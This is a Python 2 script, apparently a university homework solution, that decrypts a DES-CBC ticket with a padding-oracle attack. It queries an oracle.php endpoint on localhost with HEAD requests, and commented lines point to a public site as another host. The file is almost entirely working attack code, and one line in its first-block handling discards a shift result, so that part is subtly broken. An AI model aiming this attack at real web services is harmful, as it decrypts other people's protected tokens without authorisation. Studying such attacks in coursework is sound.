#!/usr/bin/env python

# Use padding oracle to decrypt DEC encrypted message
#
# Create by: Shi Su, AndrewId:shis
# 10/06/2015

import httplib
import argparse
import binascii
import time

ORACLE_HOST = "127.0.0.1"
QUERY_PATH = "/oracle.php?ticket="
# ORACLE_HOST = "stackoverflow.com"
# QUERY_PATH = "/search?q="
# cipher text in HW1
ENCRYPT_TICKET = "0c80353a2c634be44096f9d7977bad4d60dcd000224743105c8eacc3f872e37a2e6c8afdaecba65e8d94754e15a587ea1620cf6b6bc59a0fe5d74400a7cabebbe9fa63236a1a6c90"
BLOCK_SIZE = 8

""" 
    Ask oracle if the decrypted ticket has valid padding
    by making HEAD request as we only need the status code
    Return True if status code is 200, otherwise return False
"""
def hasValidPadding(query):
    conn = httplib.HTTPConnection(ORACLE_HOST)
    conn.request("HEAD", QUERY_PATH + query)

    status = conn.getresponse().status;


    if status == 200:
        print "----" + str(status)
        print "----" + query
        return True
    else:
        return False

"""
    Divide the long ciphertext into 16 hex string blocks
"""
def chunck(string):
    return [ int(string[i:i + BLOCK_SIZE * 2], 16) for i in range(0, len(string), BLOCK_SIZE * 2) ]

"""
    Transfer the block back to hex representation string
    To form the query string for oracle
"""
def int_to_hex_str(block):
    hex_string = hex(block)
    # use replace with 0x because strip removes ending 0s
    return hex_string.replace("0x","").strip('L').zfill(BLOCK_SIZE * 2) 

"""
    Generate the mask for updating the test byte of Ci-1
"""
def get_mask(decrypted_byte, num):
    return num << 8 * decrypted_byte

"""
    When creating valid padding for the first time in a block
    Get the actual numbers of padding byte
"""
def get_padding_num(test_block, target_block):
    print "- getting padding number -"
    print int_to_hex_str(test_block)
    # random number for a byte
    mask = 0x3200000000000000

    for i in range(0, BLOCK_SIZE):

        # int is immutable, the change here won't affect outside
        test_block = test_block^mask
        mask = mask >> 8
        query = int_to_hex_str(test_block) + int_to_hex_str(target_block)
        if not hasValidPadding(query):
            break

    return BLOCK_SIZE - i

"""
    Get actual padding when knowning the number of padding
"""
def get_padding(padding_num):
    padding = 0
    for i in range(0, padding_num):
        padding = (padding << 8) + padding_num

    print "padding is: " + hex(padding)

    return padding




def padding_attack():

    # if no other cipher text provided, decrypt the one provided in HW1
    if args.ciphertext is None:
        ciphertext = ENCRYPT_TICKET
    else:
        ciphertext = args.ciphertext

    # 2 hex character represent 1 byte, remove IV block
    length = (len(ciphertext) >> 1) - BLOCK_SIZE
    # number of block = length/8
    block_num = length >> 3
    # create a bytearray with all 0 to store decrypted text
    plaintext = bytearray(length)
    # chunck the cipher text into int blocks
    blocks = chunck(ciphertext)



    for decrypted_blocks in range(0, block_num):

        i = decrypted_blocks
        decrypted_byte = 0
        padding_num = 0
        padding = 0
        test_block = blocks[i]
        target_block = blocks[i + 1]
        dec_target = 0

        print "---------------------------------------------"
        print "decrypted_blocks: " + str(decrypted_blocks)
        print "test block: "+ int_to_hex_str(test_block)
        print "target block: "+ int_to_hex_str(target_block)


        while decrypted_byte < BLOCK_SIZE:
            print "--------------------"
            print " decrypted_bytes: " + str(decrypted_byte)
            # the byte is changing to produce a valid padding
            test_byte = BLOCK_SIZE - decrypted_byte - 1
            temp = bytearray.fromhex(int_to_hex_str(test_block))
            temp[test_byte] = 0
        
            # change 1 byte in testblock, try to generate Px with valid padding
            for x in range(0,256):

                temp[test_byte] = x

                mask = get_mask(decrypted_byte, x)

                test_block = int(binascii.hexlify(temp),16)
                #test_block = test_block ^ mask

                # send the 2 byte to oracle
                query = binascii.hexlify(temp) + int_to_hex_str(target_block)

                #query = int_to_hex_str(test_block) + int_to_hex_str(target_block)
                if hasValidPadding(query):
                    break

            if decrypted_byte == 0:
                print "decrypted first few bytes"
                padding_num = get_padding_num(test_block, target_block)
                padding = get_padding(padding_num)

                # only the last few bytes are useful
                # Dec(Ctarget) = Ptest(with padding) ^ Ctest
                dec_target = padding ^ test_block
                # Ptarget = Dec(Ctarget) ^ Ctarget-1
                block_plain = dec_target ^ blocks[decrypted_blocks]

                for y in range(0, padding_num):
                    posistion = BLOCK_SIZE * decrypted_blocks + (BLOCK_SIZE - y - 1)
                    plaintext[posistion] = block_plain & 0xff
                    block_plain >> 8

                decrypted_byte = padding_num
            else:
                padding_num = decrypted_byte + 1
                padding = get_padding(padding_num)

                # only the last few bytes are useful
                # Dec(Ctarget) = Ptest(with padding) ^ Ctest
                dec_tmp =  bytearray.fromhex(int_to_hex_str(dec_target))
                dec_tmp[test_byte] = temp[test_byte] ^ padding_num

                dec_target = int(binascii.hexlify(dec_tmp),16)
                # Ptarget = Dec(Ctarget) ^ Ctarget-1

                #block_plain = dec_target ^ blocks[decrypted_blocks]

                posistion = BLOCK_SIZE * decrypted_blocks + (BLOCK_SIZE - padding_num)
                plaintext[posistion] = dec_tmp[test_byte] ^ bytearray.fromhex(int_to_hex_str(blocks[decrypted_blocks]))[test_byte]
                #plaintext[posistion] = (block_plain >> BLOCK_SIZE - padding_num + 1) & 0xff
                decrypted_byte += 1

            print "dec_target: " + int_to_hex_str(dec_target)
            print "hex represent:" + binascii.hexlify(plaintext)

            test_block = dec_target ^ get_padding(decrypted_byte + 1)
    

    reconstruct = ""
    for block in blocks:
        reconstruct = reconstruct + int_to_hex_str(block)
    
    print "---------------------------------------------"
    print "ciphertext: " + reconstruct
    print "hex represent: " + binascii.hexlify(plaintext)
    print "ascii: " + binascii.hexlify(plaintext).decode("hex")

    return



if __name__ == "__main__":
   parser = argparse.ArgumentParser(description='Use padding attack to decrypt a DES encrypted ticket')
   parser.add_argument('-c','--ciphertext', help='DES ciphertext to be decrypted')
   args = parser.parse_args()
   padding_attack()
